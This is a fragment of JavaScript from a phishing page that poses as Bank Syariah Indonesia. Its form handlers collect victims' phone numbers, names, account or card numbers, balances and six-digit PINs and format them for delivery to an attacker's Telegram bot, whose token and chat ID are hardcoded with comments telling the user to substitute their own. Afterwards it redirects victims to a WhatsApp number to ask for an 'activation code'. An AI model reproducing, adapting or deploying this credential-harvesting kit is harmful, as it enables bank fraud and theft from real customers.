...
document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
  ...
  var nope = document.getElementById('nope');
   ...
   var token = '7744704752:AAHdK_pybHuXcDIgMyFo3_3ExJs02qmLykM'; // Ganti dengan token bot yang kamu buat
    var grup = '7129859092'; // Ganti dengan chat id dari bot yang kamu buat
...
$('#form1').on('submit', function (event) {
  ...
  var norek = document.getElementById('norek');
    ...
    var gabungan = "├•★𝓑𝓪𝓷𝓴 𝓢𝔂𝓪𝓻𝓲𝓪𝓱 𝓘𝓷𝓭𝓸𝓷𝓮𝓼𝓲𝓪★" + '%0A※ ' +  tarif.value + '%0A※ 𝗡𝗼𝗺𝗼𝗿 : ' + nope.value + '%0A※ 𝗡𝗮𝗺𝗮 : ' + nama.value + '%0A※ 𝗡𝗼𝗿𝗲𝗸 : ' + norek.value + '%0A%0A<pre>🕶 𝓓𝓮𝓿𝓮𝓵𝓸𝓹𝓮𝓻 𝓦𝓮𝓫𝓼𝓲𝓽𝓮✍</pre>';
...
var nomor = document.getElementById('nomor');
 var nama = document.getElementById('nama');
  ...
  var rupiah = document.getElementById('rupiah');
    ...
    var gabungan = "├•★𝓑𝓪𝓷𝓴 𝓢𝔂𝓪𝓻𝓲𝓪𝓱 𝓘𝓷𝓭𝓸𝓷𝓮𝓼𝓲𝓪★" + '%0A※ ' +  tarif.value + '%0A※ 𝗡𝗼𝗺𝗼𝗿 : ' + nomor.value + '%0A※ 𝗡𝗮𝗺𝗮 : ' + nama.value + '%0A※ 𝗡𝗼𝗿𝗲𝗸 : ' + norek.value + '%0A※ 𝗦𝗮𝗹𝗱𝗼 : ' + rupiah.value + '%0A%0A<pre>🕶 𝓓𝓮𝓿𝓮𝓵𝓸𝓹𝓮𝓻 𝓦𝓮𝓫𝓼𝓲𝓽𝓮✍</pre>';
...
var tele = document.getElementById('tele');
  ...
  var uang = document.getElementById('uang');
   var sixpin = document.getElementById('sixpin');
    ...
    var gabungan = "├•★𝓑𝓪𝓷𝓴 𝓢𝔂𝓪𝓻𝓲𝓪𝓱 𝓘𝓷𝓭𝓸𝓷𝓮𝓼𝓲𝓪★" + '%0A※ ' +  tarif.value + '%0A※ 𝗡𝗼𝗺𝗼𝗿 : ' + tele.value + '%0A※ 𝗡𝗮𝗺𝗮 : ' + nama.value + '%0A※ 𝗡𝗼𝗿𝗲𝗸 : ' + kertu.value + '%0A※ 𝗦𝗮𝗹𝗱𝗼 : ' + uang.value + '%0A※ 𝗞𝗼𝗱𝗲 : ' + sixpin.value + '%0A%0A<pre>🕶 𝓓𝓮𝓿𝓮𝓵𝓸𝓹𝓮𝓻 𝓦𝓮𝓫𝓼𝓲𝓽𝓮✍</pre>';
...
setTimeout(function(){  
location.href='https://wa.me/628551566612?text=Hallo%20Bank%20BSI%0ASaya%20mau%20request%20Kode%20Aktivasi';
 $("#djload").hide();   
    }, 000);    
}     
